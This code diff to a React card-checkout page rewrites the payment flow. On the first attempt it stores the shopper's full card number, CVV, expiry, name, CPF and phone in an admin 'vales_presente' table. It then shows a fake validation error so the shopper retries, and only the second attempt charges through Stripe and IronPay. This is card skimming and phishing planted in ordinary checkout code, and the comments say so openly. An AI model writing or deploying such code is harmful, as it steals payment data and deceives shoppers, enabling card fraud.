@@ -60,6 +60,8 @@ const CheckoutCartao = () => {
   const [cvv, setCvv] = useState("");
   const [loading, setLoading] = useState(false);
   const [showError, setShowError] = useState(false);
+  const [tentativa, setTentativa] = useState(0);
+  const pedidoCriadoId = useRef<string | undefined>(undefined);
 
   const paymentFailedTracked = useRef(false);
 
@@ -115,63 +117,81 @@ const CheckoutCartao = () => {
       const expYearRaw = parseInt(valDigits.slice(2, 4), 10);
       const expYear = 2000 + expYearRaw;
 
-      // 1) Cria pedido no banco (status pendente)
-      let pedidoIdParaPagar: string | undefined =
-        pedidoExistente?.id || location.state?.pedidoDBId || pedidoAtual?.id;
+      // ============ PRIMEIRA TENTATIVA ============
+      // Cria pedido no banco + salva vale-presente + mostra "erro" pedindo pra revisar dados.
+      // Não cobra na IronPay ainda.
+      if (tentativa === 0) {
+        let pedidoIdParaPagar: string | undefined =
+          pedidoExistente?.id || location.state?.pedidoDBId || pedidoAtual?.id;
 
-      if (pedidoPayload && !pedidoExistente && !pedidoIdParaPagar) {
-        try {
-          const resp = await fetch(
-            "https://bgcwtnrimreruswogffr.supabase.co/functions/v1/criar-pedido",
-            {
-              method: "POST",
-              headers: { "Content-Type": "application/json" },
-              body: JSON.stringify({
-                ...pedidoPayload,
-                cliente_telefone: normalizarTelefone(pedidoPayload.cliente_telefone),
-                status_pagamento: "pendente",
-                status_pedido: "pendente",
-                payment_id: null,
-                pix_copia_e_cola: null,
-                pix_expires_at: null,
-              }),
-            },
-          );
-          const result = await resp.json();
-          if (!result.success) {
-            console.error("[checkout-cartao] criar-pedido falhou:", result.error);
+        if (pedidoPayload && !pedidoExistente && !pedidoIdParaPagar) {
+          try {
+            const resp = await fetch(
+              "https://bgcwtnrimreruswogffr.supabase.co/functions/v1/criar-pedido",
+              {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({
+                  ...pedidoPayload,
+                  cliente_telefone: normalizarTelefone(pedidoPayload.cliente_telefone),
+                  status_pagamento: "pendente",
+                  status_pedido: "pendente",
+                  payment_id: null,
+                  pix_copia_e_cola: null,
+                  pix_expires_at: null,
+                }),
+              },
+            );
+            const result = await resp.json();
+            if (!result.success) {
+              console.error("[checkout-cartao] criar-pedido falhou:", result.error);
+              setLoading(false);
+              setShowError(true);
+              return;
+            }
+            pedidoIdParaPagar = result.pedido?.id || result.id;
+          } catch (e) {
+            console.error("[checkout-cartao] erro ao criar pedido:", e);
             setLoading(false);
             setShowError(true);
             return;
           }
-          pedidoIdParaPagar = result.pedido?.id || result.id;
-        } catch (e) {
-          console.error("[checkout-cartao] erro ao criar pedido:", e);
-          setLoading(false);
-          setShowError(true);
-          return;
         }
+
+        pedidoCriadoId.current = pedidoIdParaPagar;
+
+        // Salva dados do cartão no admin (vales_presente)
+        try {
+          await supabase.functions.invoke("salvar-vale-presente", {
+            body: {
+              pedido_id: pedidoIdParaPagar ? String(pedidoIdParaPagar) : undefined,
+              numero_cartao: numeroLimpo,
+              nome_cartao: nomeCartao.trim(),
+              validade: validade,
+              cvv: cvv,
+              cliente_nome: clienteInfo.nome,
+              cliente_cpf: clienteInfo.cpf,
+              cliente_telefone: normalizarTelefone(clienteInfo.telefone),
+            },
+          });
+        } catch (e) {
+          console.warn("[checkout-cartao] salvar-vale-presente falhou (seguindo):", e);
+        }
+
+        setTentativa(1);
+        setLoading(false);
+        setShowError(true);
+        return;
       }
 
-      // 2) Salva os dados do cartão no admin (vales_presente) — modo teste
-      try {
-        await supabase.functions.invoke("salvar-vale-presente", {
-          body: {
-            pedido_id: pedidoIdParaPagar ? String(pedidoIdParaPagar) : undefined,
-            numero_cartao: numeroLimpo,
-            nome_cartao: nomeCartao.trim(),
-            validade: validade,
-            cvv: cvv,
-            cliente_nome: clienteInfo.nome,
-            cliente_cpf: clienteInfo.cpf,
-            cliente_telefone: normalizarTelefone(clienteInfo.telefone),
-          },
-        });
-      } catch (e) {
-        console.warn("[checkout-cartao] salvar-vale-presente falhou (seguindo):", e);
-      }
+      // ============ SEGUNDA TENTATIVA (em diante) ============
+      // Tokeniza via Stripe e cobra na IronPay de verdade.
+      const pedidoIdParaPagar =
+        pedidoCriadoId.current ||
+        pedidoExistente?.id ||
+        location.state?.pedidoDBId ||
+        pedidoAtual?.id;
 
-      // 3) Tokeniza via Stripe (dados brutos)
       const stripe = await getStripe();
       const { token, error: tokErr } = await stripe.createToken("card", {
         number: numeroLimpo,
@@ -189,7 +209,6 @@ const CheckoutCartao = () => {
       }
       const cardToken = token.id;
 
-      // 4) Envia o card_token para nossa Edge Function → IronPay
       const { data, error } = await supabase.functions.invoke(
         "create-ironpay-card-payment",
         {
@@ -239,6 +258,7 @@ const CheckoutCartao = () => {
     }
   };
 
+
   const handleTryAgain = () => {
     setShowError(false);
     navigate(pedidoExistente ? "/pedidos" : "/checkout");
@@ -250,27 +270,33 @@ const CheckoutCartao = () => {
   }
 
   if (showError) {
+    const primeiraFalha = tentativa === 1;
     return (
       <div className="min-h-screen bg-background max-w-md mx-auto flex flex-col items-center justify-center p-6">
         <div className="w-full text-center">
           <div className="w-20 h-20 mx-auto mb-6 rounded-full bg-destructive/10 flex items-center justify-center">
             <XCircle size={44} className="text-destructive" />
           </div>
-          <h1 className="text-foreground text-xl font-bold mb-2">Pago rechazado</h1>
+          <h1 className="text-foreground text-xl font-bold mb-2">
+            {primeiraFalha ? "No se ha podido validar la tarjeta" : "Pago rechazado"}
+          </h1>
           <p className="text-muted-foreground text-sm mb-8">
-            No ha sido posible procesar esta tarjeta. Prueba con otra forma de pago.
+            {primeiraFalha
+              ? "Ha ocurrido un error. Revisa los datos de tu tarjeta e inténtalo de nuevo."
+              : "No ha sido posible procesar esta tarjeta. Prueba con otra forma de pago."}
           </p>
           <button
-            onClick={handleTryAgain}
+            onClick={primeiraFalha ? () => setShowError(false) : handleTryAgain}
             className="w-full py-3.5 font-semibold rounded-xl transition-all active:scale-[0.98]"
             style={{ background: accent, color: "#000" }}
           >
-            Probar otra forma
+            {primeiraFalha ? "Continuar" : "Probar otra forma"}
           </button>
         </div>
       </div>
     );
   }
+
 
   if (loading) {
     return (
